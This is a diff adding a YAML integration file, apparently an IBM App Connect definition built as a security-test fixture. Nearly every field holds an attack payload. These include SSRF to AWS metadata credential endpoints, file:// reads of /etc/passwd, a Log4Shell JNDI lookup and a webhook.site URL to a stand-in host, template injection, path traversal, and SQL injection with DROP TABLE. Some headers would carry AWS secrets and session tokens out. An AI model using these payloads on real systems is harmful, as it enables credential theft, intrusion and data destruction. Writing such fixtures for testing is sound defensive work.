@@ -1,0 +1,74 @@
+$integration: http://ibm.com/appconnect/integration/v2/integrationFile
+integration:
+  type: api
+  trigger-interfaces:
+    trigger-interface-1:
+      triggers: 
+        malicious-trigger:
+          description: |
+            Test SSRF to internal services
+            <!-- Attempt to read AWS metadata -->
+            http://169.254.169.254/latest/meta-data/
+            http://169.254.169.254/latest/user-data/
+            http://169.254.169.254/latest/meta-data/iam/security-credentials/
+            
+            <!-- Internal network scan -->
+            http://192.168.1.1:80/
+            http://10.0.0.1:80/
+            http://172.17.0.1:80/
+            
+            <!-- Local file inclusion attempts -->
+            file:///etc/passwd
+            file:///proc/self/environ
+            file:///var/aws/secrets/credentials
+          parameters:
+            - name: url
+              value: "http://internal-database.aws.local:3306/"
+            - name: secret
+              value: "${aws_access_key}:${aws_secret_key}"
+      options:
+        resources:
+          - "http://webhook.site/YOUR_UNIQUE_ID?test=ssrf"
+          - "${jndi:ldap://YOUR_SERVER.com/x}"
+          - "#{7*7}"
+          - "{{7*7}}"
+          - "<%= 7*7 %>"
+        headers:
+          Authorization: "Bearer ${ENV:AWS_SESSION_TOKEN}"
+          X-Forwarded-For: "127.0.0.1"
+          Host: "internal-api.aws.local"
+      type: api-trigger
+  action-interfaces:
+    dynamo-action:
+      type: dynamodb
+      parameters:
+        tableName: "../../../etc/passwd"
+        region: "us-east-1"
+        credentials: 
+          accessKeyId: "${env:AWS_ACCESS_KEY_ID}"
+          secretAccessKey: "#{ENV['AWS_SECRET_ACCESS_KEY']}"
+      operations:
+        - operation: "scan"
+          expression: "1; DROP TABLE users--"
+        - operation: "query" 
+          statement: "SELECT * FROM users WHERE 1=1 UNION SELECT database()--"
+  assemblies:
+    malicious-assembly:
+      properties:
+        databaseUrl: "jdbc:postgresql://localhost:5432/test?user=root&password=pass"
+        internalEndpoint: "http://[::1]:3000/admin"
+        cloudMetadata: "http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+  name: "Malicious_Integration_${java:version}"
+models:
+  UserModel:
+    type: object
+    properties:
+      username: 
+        type: string
+        example: "../../../etc/passwd"
+      password:
+        type: string  
+        example: "${log4j:configParentLocation}"
+      metadata:
+        type: string
+        example: "http://localhost:22/"
